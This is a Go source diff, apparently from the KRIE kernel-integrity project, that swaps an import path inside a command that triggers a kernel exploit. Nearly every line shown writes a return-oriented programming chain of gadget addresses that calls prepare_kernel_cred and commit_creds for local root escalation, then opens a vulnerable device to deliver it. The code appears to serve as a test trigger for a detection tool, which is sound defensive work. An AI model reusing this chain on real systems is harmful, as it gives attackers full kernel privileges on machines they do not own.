@@ -26,7 +26,8 @@ import (
 	"syscall"
 	"unsafe"
 
-	"github.com/Gui774ume/krie/pkg/krie"
+	"github.com/Gui774ume/krie/pkg/krie/events"
+
 	"github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
 	"golang.org/x/sys/unix"
@@ -217,21 +218,21 @@ func triggerCmd(cmd *cobra.Command, args []string) error {
 	stackCursor := int(fakeStackAddr - fakeStackPageBaseAddr)
 
 	// start writing the rop chain
-	krie.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff81010663)) // pop rdi ; ret
+	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff81010663)) // pop rdi ; ret
 	stackCursor += 8
 	// account for ret 0xd from the stack pivot
 	stackCursor += 0xd
-	krie.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], uint64(0)) // NULL
+	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], uint64(0)) // NULL
 	stackCursor += 8
-	krie.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff810c54d0)) // @prepare_kernel_cred
+	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff810c54d0)) // @prepare_kernel_cred
 	stackCursor += 8
-	krie.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff81010bfa)) // pop rdx ; ret
+	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff81010bfa)) // pop rdx ; ret
 	stackCursor += 8
-	krie.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff810c5156)) // @commit_creds + 2 instructions
+	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff810c5156)) // @commit_creds + 2 instructions
 	stackCursor += 8
-	krie.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff81012335)) //  mov rax, rdi ; ret
+	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff81012335)) //  mov rax, rdi ; ret
 	stackCursor += 8
-	krie.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff82cd0e16)) // mov rdi, rax ; call rdx
+	events.ByteOrder.PutUint64(kernelStack[stackCursor:stackCursor+8], mustComputeKernelAddr(0xffffffff82cd0e16)) // mov rdi, rax ; call rdx
 	stackCursor += 8
 
 	f, err := os.OpenFile(options.VulnDevicePath, os.O_WRONLY, 0)
